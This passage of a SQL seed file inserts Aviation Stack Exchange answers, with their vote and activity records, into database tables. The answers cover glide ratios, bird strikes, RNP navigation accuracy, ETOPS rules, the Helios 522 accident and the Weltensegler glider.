Some cargo holds may be pressurised, some are not. Depends on the aircraft and the requirements of the cargo (life animals want a pressurised cabin of course, just to give one example).&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (206, 177, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (206, 49, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (206, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (206, 49, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (206, 49, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 4, 2);
INSERT INTO postinstance (post_id, user_id, description) VALUES (207, 2, '&lt;p&gt;If you were to take off from an airport at 2,000&#x27; ASL on a standard day, and climb to 7,280&#x27; ASL you would be exactly 5,280&#x27; above the ground which means exactly 1 statute mile above the ground. &lt;/p&gt;

&lt;p&gt;If you were to cut the engine, and then use the information available in the chart, you should be able to glide about 10 statute miles which yields about a 10 to 1 glide ratio.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/p3jt5.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/p3jt5.jpg&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (207, 178, 'True');
INSERT INTO activity ( post_id, user_id, action) VALUES (207, 2, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (207, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (207, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (207, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (207, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (207, 2, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (207, 2, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 4, 2);
INSERT INTO postinstance (post_id, user_id, description) VALUES (208, 34, '&lt;blockquote&gt;
  &lt;p&gt;Do they happen as frequent as planes?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Here is a link to the &lt;a href=&quot;http://wildlife.faa.gov/database.aspx&quot; rel=&quot;nofollow noreferrer&quot; title=&quot;Federal Aviation Administration&amp;#39;s wildlife strike database&quot;&gt;Federal Aviation Administration&#x27;s Wildlife Strike database&lt;/a&gt;. Here you can search all the recorded wildlife strikes in the USA, and filter them by various things, including Engine Type.&lt;/p&gt;

&lt;p&gt;To get a good idea of how many helicopter bird strikes occur in comparison to other aircraft, we can compare how many bird strikes occurred in turboshaft (&lt;strong&gt;Engine Type F&lt;/strong&gt;) engine aircraft to the total number of bird strikes. &lt;/p&gt;

&lt;p&gt;From January 1, 1990 to January 1, 2017...&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;California&lt;/em&gt;
   - There have been 31 turboshaft engine wildlife strikes, accounting for &lt;em&gt;0.22%&lt;/em&gt; out of the total &lt;em&gt;13,698&lt;/em&gt;.&lt;/p&gt;
  
  &lt;p&gt;&lt;em&gt;Texas&lt;/em&gt;
   - There have been 46 turboshaft engine wildlife strikes, accounting for &lt;em&gt;0.30%&lt;/em&gt; out of the total &lt;em&gt;15,520&lt;/em&gt;.&lt;/p&gt;
  
  &lt;p&gt;&lt;em&gt;Florida&lt;/em&gt;
   - There have been 22 turboshaft engine wildlife strikes, accounting for &lt;em&gt;0.20%&lt;/em&gt; out of the total &lt;em&gt;11,119&lt;/em&gt;.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This data would suggest that roughly 0.25% of all wildlife strikes are on helicopters.&lt;/p&gt;

&lt;p&gt;Taking another piece of data from the &lt;a href=&quot;https://www.faa.gov/air_traffic/by_the_numbers/&quot; rel=&quot;nofollow noreferrer&quot; title=&quot;FAA&quot;&gt;FAA&lt;/a&gt;, we find that the ratio of rotocraft to general aviation aircraft in 2015 is 9,766 to 199,927, meaning that helicopters account for roughly 4.66% of total aircraft. &lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;Combining these two pieces of data, we can see that since 0.25% of all wildlife strikes are on helicopters, but helicopters account for 4.66% of aircraft,  &lt;strong&gt;helicopters encounter wildlife strikes at a rate of ~18.64 times less&lt;/strong&gt; than general aviation aircraft. &lt;/p&gt;

&lt;p&gt;(Disclaimer: Data used above is rounded and averaged. This is a ROUGH estimate!)&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (208, 182, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (208, 34, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (208, 34, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (208, 34, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (208, 34, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (208, 34, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (208, 34, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (208, 34, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (209, 25, '&lt;p&gt;The requirement on Performance Based Navigation (PBN) equipment is that: 
(1) The Total System Error (TSE) must be equal to or less than the
   Required Navigation Performance (RNP) value for the procedure for 95%
   of the flight time; and
(2) The probability that the TSE of the aircraft exceeds the specified
   TSE limit (equal to two times the RNP value) without annunciation
   (notification of the pilot) is less than 10^(−5).&lt;/p&gt;

&lt;p&gt;My experience (doing planning work and analysis) is that the distance between two airports is calculated &#x27;along the ground&#x27; and does not account for altitude.&lt;/p&gt;

&lt;p&gt;The distance between two points (e.g., airports) computed using a great circle approximation is less that 0.5% of the distance for ellipsoidal earth (and usually less that 0.3%). Vincenty&#x27;s algorithm is one good method for calculating distance along the ellipsoid surface. Matlab implementations are available on the web. &lt;/p&gt;

&lt;p&gt;The problem with using Cartesian (ECEF) coordinates is you almost have to then calculate a straight-line distance for a path that pierces the earth, rather that a distance along the earth&#x27;s surface (which is what you want).&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (209, 184, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (209, 25, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 14, 7);
INSERT INTO postinstance (post_id, user_id, description) VALUES (210, 44, '&lt;p&gt;Highest I&#x27;ve ever heard of is 40,000 ft. &lt;/p&gt;

&lt;p&gt;On May 19, 2014 Atlas Air flight GTI8665, a 767-300 freighter, reported a bird strike at FL400 over Indiana. They were unable to tell what type of bird it was but the pilots reported that there were guts on the windshield. The windshield was broken and the aircraft was diverted.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/x7rVg.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/x7rVg.jpg&quot; alt=&quot;Broken windshield of &quot;&gt;&lt;/a&gt;
~&lt;sup&gt;Screen grab from video below&lt;/sup&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://youtu.be/O0foHizWAmQ&quot; rel=&quot;nofollow noreferrer&quot;&gt;ATC Recording&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/mcNde.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/mcNde.jpg&quot; alt=&quot;enter image description here&quot;&gt;&lt;/a&gt;&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (210, 185, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (210, 44, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (210, 44, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (211, 41, '&lt;p&gt;I may have more news on that next week from Sun &#x27;n Fun 2017.  Pipistrel will be an exhibitor at the show and may have a Panthera prototype on display.&lt;/p&gt;

&lt;p&gt;Currently the Panthera is planned to be released as an experimental kit and may be type certified at some point in the future.&lt;/p&gt;

&lt;p&gt;I know the program has suffered some setbacks, including an increase of empty weight by some 200 lbs.  New aircraft development is never fast nor without complications.&lt;/p&gt;

&lt;p&gt;The Panthera does look intriguing - 200 KIAS on 10 GPH with good, stable flight characteristics and modern avionics, BRS parachute, etc.  I want to take it for a demo flight when production examples become available.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (211, 181, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (211, 41, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (211, 41, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 6, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (212, 43, '&lt;p&gt;The inspiration for the Weltensegler wing were birds. The reason for their wing shape is structural, however, not aerodynamic. Your photo shows the 1922 version, called &quot;Baden-Baden Stolz&quot;, which was a follow-on to the original and more ambitious version of 1921. The 3-side-view below shows the planform (picture &lt;a href=&quot;http://www.histaviation.com/images/wwb_img2620.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;source&lt;/a&gt;). However, this airplane never flew, which probably saved the life of its pilot. While pitch and limited roll control was possible with the elevons on the outer wings, no consideration was given to directional control.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/fy317.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/fy317.jpg&quot; alt=&quot;Weltensegler 3-side view&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;The 1921 version was controlled by warping of the outer wings, the washout of which was controlled with pulleys and springs. The idea was that this would help to adjust the wing shape to flight speed. The picture below shows the first and last flight, which is historically significant as the first glider flight in which a considerable gain in height was achieved. However, it ended in a spiral dive which killed its pilot (picture &lt;a href=&quot;http://histaviation.com/images/img2523.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;source&lt;/a&gt;).&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://i.stack.imgur.com/WZ8J2.jpg&quot; rel=&quot;nofollow noreferrer&quot;&gt;&lt;img src=&quot;https://i.stack.imgur.com/WZ8J2.jpg&quot; alt=&quot;Weltensegler 1921 in flight&quot;&gt;&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Weltensegler&quot; rel=&quot;nofollow noreferrer&quot;&gt;Weltensegler&lt;/a&gt; is actually the name of the company which was founded by Friedrich Wenk. &lt;a href=&quot;https://en.wikipedia.org/wiki/Alexander_Lippisch&quot; rel=&quot;nofollow noreferrer&quot;&gt;Alexander Lippisch&lt;/a&gt; was one of his employees.&lt;/p&gt;

&lt;p&gt;The configuration cannot be recommended for a glider. It is much better to have a straight inner wing and dihedraled outer wings, as explained in &lt;a href=&quot;http://aviation.stackexchange.com/questions/32801/what-kind-of-dihedral-would-be-most-stable/32815#32815&quot;&gt;this answer&lt;/a&gt;. The anhedral of the outer wings of the Weltensegler wings will produce a downforce on the windward wing, rolling it into the wind which is the opposite of what is needed for coordinated flight. &lt;a href=&quot;http://aviation.stackexchange.com/questions/21063/what-advantages-come-with-the-wing-on-the-boeing-bird-of-prey/21068#21068&quot;&gt;Other configurations&lt;/a&gt; using an &quot;M&quot;-shaped wing did so for different reasons and use rudders and much more anhedral on the outer wing panels.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (212, 186, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (212, 43, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (212, 43, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (212, 43, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (212, 43, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (212, 43, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (212, 43, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (212, 43, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (213, 41, '&lt;p&gt;You will have to obtain this from the Pilot&#x27;s Operating Handbook for the particular aircraft you are flying.  Piper usually has a glide performance figure in the Perfeomance section of the POH.  Trying to calculate your glide distance or glide ration by other means and you are probably entering dangerous waters.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (213, 178, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (213, 41, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (213, 41, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (213, 41, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 0, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (214, 36, '&lt;p&gt;On a crew bus the other day at American. Mgmt type said it like this. If the Cabin Alt goes above 14000, the aircraft starts a 15 sec timer. If no intervention from the crew, it initiates an Emergency descent. Power back and spoilers. Vmo/Mmo-10kts. It even changes the squawk to 7700. The aircraft will level off at 10,000 or Grid MORA whichever is higher. &lt;/p&gt;

&lt;p&gt;Was also told that it will auto respond to a TCAS RA if the autopilot is on.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (214, 187, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (214, 36, 'Create');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 1, 0);
INSERT INTO postinstance (post_id, user_id, description) VALUES (215, 37, '&lt;p&gt;The ETOPS requirement is pretty much the same for all aircraft irrespective of usage as long as its under parts 121 or 135, as noted in the FAA InFO 07004, &lt;a href=&quot;https://www.faa.gov/other_visit/aviation_industry/airline_operators/airline_safety/info/all_infos/media/2007/info07004.pdf&quot; rel=&quot;nofollow noreferrer&quot;&gt;New ETOPS Regulations&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The new ETOPS rules are now applicable to: &lt;/p&gt;
  
  &lt;p&gt;Part 121 &lt;/p&gt;
  
  &lt;p&gt;• All two-engine airplanes more than 60 minutes flying time from an adequate airport (at a one-engine-inoperative cruise speed under standard conditions in still air). &lt;/p&gt;
  
  &lt;p&gt;• All passenger-carrying airplanes with more than two engines and more than 
  180 minutes flying time from an adequate airport (at a one-engine-inoperative 
  cruise speed under standard conditions in still air). &lt;/p&gt;
  
  &lt;p&gt;Part 135 &lt;/p&gt;
  
  &lt;p&gt;• All multi-engine turbine-engine powered airplanes (other than all-cargo 
  operations with airplanes having more than two engines) more than 180 
  minutes flying time (limited to 240 minutes flying time) from an airport 
  meeting the requirements of part 135, §§ 135.385 or 135.393 and 135.219 at 
  an approved one-engine-inoperative cruise speed under standard conditions in 
  still air. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As far as differences are concerned, &lt;a href=&quot;https://www.federalregister.gov/documents/2007/01/16/07-39/extended-operations-etops-of-multi-engine-airplanes&quot; rel=&quot;nofollow noreferrer&quot;&gt;ETOPS is waived only in one case&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;The FAA ... however agree that for airplanes with more than two engines, passenger carrying operations may be excluded from the ETOPS maintenance program requirements and that all-cargo operations may be excluded from all ETOPS requirements. &lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;The definition of ETOPS in the same document covers all aircraft except four engined all-cargo aircraft:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Extended Operations (ETOPS) means an airplane flight operation other than an all-cargo operation in an airplane with more than two engines during which a portion of the flight is conducted beyond a time threshold identified in part 121 or part 135 of this chapter that is determined using an approved one-engine-inoperative cruise speed under standard atmospheric conditions in still air.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;As far as non-revenue flights are considered, they are usually operated under Part 91, so the ETOPS rules don&#x27;t apply. However, it is better to plan an ETOPS route for safety considerations (and to keep insurers happy).&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (215, 188, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (215, 37, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (215, 37, 'Upvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 6, 3);
INSERT INTO postinstance (post_id, user_id, description) VALUES (216, 2, '&lt;p&gt;First and foremost you should read the accident report which you &lt;a href=&quot;http://www.aaiu.ie/sites/default/files/Hellenic%20Republic%20Accident%20Helios%20Airways%20B737-31S%20HCY522%20Grammatiko%20Hellas%202005-085-14.pdf&quot; rel=&quot;nofollow noreferrer&quot;&gt;can find in full here&lt;/a&gt;. I will pull some excerpts from that below. &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;Helios Flight 522 crashed when the crew unknowingly suffered hypoxia.
  Although the masks in the passenger cabin deployed, the crew were
  unaware of this and didn&#x27;t realize the extent of the problem.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is the one of the debated/interesting aspects of the accident. The crew would have been alerted by &lt;a href=&quot;http://www.b737.org.uk/pressurisation.htm#Cabin_Altitude_Warning_Horn&quot; rel=&quot;nofollow noreferrer&quot;&gt;alarms to the depressurization event&lt;/a&gt;&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;...Non-identification of the warnings and the reasons for the activation
  of the warnings (&lt;strong&gt;Cabin Altitude Warning Horn&lt;/strong&gt;, Passenger Oxygen Masks
  Deployment indication, &lt;strong&gt;Master Caution&lt;/strong&gt;).&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Many might say they did in fact know there was a problem but for some unknown reason they did nothing about it. Generally speaking &quot;Don Oxygen Masks&quot; is the first item on the emergency checklist following &lt;a href=&quot;https://en.wikipedia.org/wiki/1999_South_Dakota_Learjet_crash&quot; rel=&quot;nofollow noreferrer&quot;&gt;the mishap of the South Dakota LearJet crash in 1999&lt;/a&gt;. One can conclude from the report that its possible the pilots assumed the cabin pressure system was in the proper place (auto) when in fact it was set to manual (MAN) and subsequently were confused by the alarm or thought it was faulty. &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;...that the following factors could have contributed to the accident:
  omission of returning the &lt;strong&gt;cabin pressurization mode selector to the
  AUTO position after non-scheduled maintenance&lt;/strong&gt; on the aircraft;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This is a procedural failure on the implementation end. The report would cite bad procedures for this &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;...the report also identifies a number of additional safety deficiencies
  pertaining to: maintenance procedures; pilot training, normal and
  emergency procedures; organizational issues of the Operator;
  organizational issues related to safety oversight of maintenance and
  flight operations by Cyprus DCA, EASA/JAA and ICAO; issues related to
  the aircraft manufacturer’s documentation for maintenance and flight
  operations;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;If I was a passenger on a plane at cruise altitude and the oxygen
  masks deployed, I know that there is only about 10 minutes oxygen
  available. I would expect the plane to immediately descend to a lower
  altitude.&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There are some assumptions here of course first and foremost that the plane is still maneuverable. There are any number of things that could cause a depressurization and some may also cause flight control issues as we saw &lt;a href=&quot;https://en.wikipedia.org/wiki/Aloha_Airlines_Flight_243&quot; rel=&quot;nofollow noreferrer&quot;&gt;Aloha Airlines Flight 243&lt;/a&gt; a situation where the crew did not immediately know what was going on. However generally speaking, once the issue has been identified the plane &lt;em&gt;should&lt;/em&gt; start a decent if possible. &lt;/p&gt;

&lt;hr&gt;

&lt;blockquote&gt;
  &lt;p&gt;&lt;em&gt;If I don&#x27;t notice any change in attitude and there is no passenger
  announcement after a few minutes, would it help to alert a flight
  attendant to check that the pilots are aware of the issue? Or would it
  be best to assume that &#x27;they know what they are doing&#x27; and just keep
  quiet?&lt;/em&gt;&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;This of course brings up another debate. In almost all cases you should alert the crew to anything you feel is strange our out of place. Of course in this instance it may be hard to move about the cabin, and potentially hard to shout or get your message to the crew. In some cases the crew may be working the issue and getting in the way of that can be problematic. Again generally alerting them is a good thing but its a situation by situation basis for sure. &lt;/p&gt;

&lt;hr&gt;

&lt;p&gt;In regards to the comments on other answers you will not die, at least one flight attendant (who was also a pilot) survived the ordeal and made his way into the cockpit as was heard on the CVR &lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;At 08:54:18 h, the following distress was recorded by the CVR “MAYDAY,
  MAYDAY, MAYDAY, Helios Airways Flight 522 Athens … (unintelligible
  word)”. A few seconds later, another “MAYDAY, MAYDAY” with a very weak
  voice was recorded.When the Boeing 737 was at about 7 000 ft, the
  person in the Captain’s seat for the first time appeared to
  acknowledge the presence of the F-16s and he made a hand motion.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;hr&gt;

&lt;blockquote&gt;
  &lt;p&gt;Could a knowledgeable passenger have saved Helios Flight 522?&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Unlikely as these days its hard to get in the cockpit, or even get a message to the pilots. But you should, in any event at least try. This saved some lives on &lt;a href=&quot;https://en.wikipedia.org/wiki/Air_Florida_Flight_90&quot; rel=&quot;nofollow noreferrer&quot;&gt;Air Florida 90 when a passenger realized icing on the wings and assumed the crash position and informed the other around him&lt;/a&gt;.  &lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (216, 189, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (216, 2, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (216, 2, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 3, 2);
INSERT INTO postinstance (post_id, user_id, description) VALUES (217, 45, '&lt;p&gt;It seems from the Wikipedia page that there was indeed an knowledgeable passenger. Not fully qualified, but ...&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;At 11:49, flight attendant Andreas Prodromou entered the cockpit and sat down in the captain&#x27;s seat, having remained conscious by using a portable oxygen supply. Prodromou held a UK Commercial Pilot License, but was not qualified to fly the Boeing 737. Crash investigators concluded that Prodromou&#x27;s experience was insufficient for him to gain control of the aircraft under the circumstances. Prodromou waved at the F16s very briefly, but almost as soon as he entered the cockpit, the left engine flamed out due to fuel exhaustion and the plane left the holding pattern and started to descend. Ten minutes after the loss of power from the left engine, the right engine also flamed out, and just before 12:04 the aircraft crashed into hills near Grammatiko.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;So depending on how knowledgeable you&#x27;re looking for, this seems pretty clear-cut.&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://en.wikipedia.org/wiki/Helios_Airways_Flight_522&quot; rel=&quot;nofollow noreferrer&quot;&gt;https://en.wikipedia.org/wiki/Helios_Airways_Flight_522&lt;/a&gt;&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (217, 189, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (217, 45, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (217, 45, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (217, 45, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (217, 45, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (217, 45, 'Downvote');
INSERT INTO activity (post_id, user_id, action) VALUES (217, 45, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 3, 1);
INSERT INTO postinstance (post_id, user_id, description) VALUES (218, 1, '&lt;p&gt;The aviation industry is in the process of moving to Performance Based Navigation (PBN) within Required Navigation Performance (RNP) airspace.  Using this structure the primary performance is measured by the Total System Error (TSE) which must be less than 2 times the RNP value 95% of the time. Example: In RNP 1 airspace the aircraft must maintain positional accuracy within 2.0 NM of its desired path 95% of the time. The standard for navigational equipment (FMS) is defined in RTCA document &lt;a href=&quot;http://www.rtca.org/store_product.asp?prodid=1229&quot; rel=&quot;nofollow noreferrer&quot;&gt;DO-283B&lt;/a&gt;, Minimum Operational Performance Standards for Required Navigation Performance for Area Navigation.  &lt;/p&gt;

&lt;p&gt;The TSE for an aircraft is broken down into three components; path definition error (PDE), position estimation error (PEE), and path steering error (PSE).  Your question directly relates to PDE.  The accuracy of PDE depends on several components, the primary one being the accuracy of the positional (fix) information published by the regulatory agency (FAA in the US) contained within the navigational database. For enroute and terminal airspace, the accuracy of fix information is less than 0.01 minutes of latitude and longitude or about 17 meters.  &lt;/p&gt;

&lt;p&gt;Using the data from the database and the WGS84 earth model, the FMS will compute lateral path data.  Lateral paths are computed as a geodesic on the surface of the WGS84 ellipsoid.&lt;/p&gt;

&lt;p&gt;DO-283 specifies the following data (among other) resolutions for display and entry: &lt;/p&gt;

&lt;p&gt;Distance:  0.1 NM for values &amp;lt;10 NM, 1 NM for values &gt;=10 NM&lt;br&gt;
Fix latitude/longitude: 0.01 min&lt;br&gt;
RNP:  0.01 NM for values &amp;lt;1.0 NM, 0.1 NM for values &gt;=1.0, and &amp;lt;10 NM, 1 NM  for values &gt;=10 NM&lt;br&gt;
EPU: 0.01 NM for values &amp;lt;1.0 NM, 0.1 NM for values &gt;=1.0, and &amp;lt;10 NM, 1 NM for values &gt;=10 NM&lt;br&gt;
Present Position latitude/longitude: 0.1 min&lt;/p&gt;

&lt;p&gt;DO-283 also states rounding of displayed data is desired.  For that reason internal FMS computations normally are performed to 1 decimal place more than the displayed resolution and then rounded.  &lt;/p&gt;

&lt;p&gt;From the above you can see that the displayed distance of a leg should be within 0.1 NM for distances less than 10 NM and 1 NM for longer distances.  &lt;/p&gt;

&lt;p&gt;As for your 3-D question, lateral (LNAV) and vertical (VNAV) navigation are computed separately.  VNAV is still predominately barometric based except for precision (GBAS) and near precision (SBAS) approaches which use WGS84 geometric height.  &lt;/p&gt;

&lt;p&gt;For positional data, along with the present position, the system must calculate an estimated positional uncertainty (EPU) as shown in the table.  The EPU calculation is quite complex and varies based on the source of the positional data (GPS, IRS, etc.)  This value when added to the PSE (cross-track deviation + errors) should be held within the RNP value.  As you can see form the structure of the EPU requirement, it is the most significant component of the system error.&lt;/p&gt;

&lt;p&gt;Summary:  &lt;/p&gt;

&lt;p&gt;Calculating a geodesic path is required by the MOPS. Great circle is not acceptable.  &lt;/p&gt;

&lt;p&gt;Paths are calculated using lat/lon and baro altitude coordinates.  Distances are output in nautical miles; not feet, meters, or km.  Internally, the systems can use what ever they want.  Altitude is in feet or meters, depending on airspace rules.  The 3-D path is used to predict time of arrival at each fix along the route.&lt;/p&gt;

&lt;p&gt;Positional accuracy (EPU) is calculated based on the selected nav sensor(s) using a number of statistical methods including Kalmann filters.&lt;/p&gt;
');
INSERT INTO answer (post_id, question_id, accepted) VALUES (218, 184, 'False');
INSERT INTO activity ( post_id, user_id, action) VALUES (218, 1, 'Create');
INSERT INTO activity (post_id, user_id, action) VALUES (218, 1, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (218, 1, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (218, 1, 'Upvote');
INSERT INTO activity (post_id, user_id, action) VALUES (218, 1, 'Downvote');

INSERT INTO post (current_state, up_score, down_score) VALUES ('Published', 2, 0);
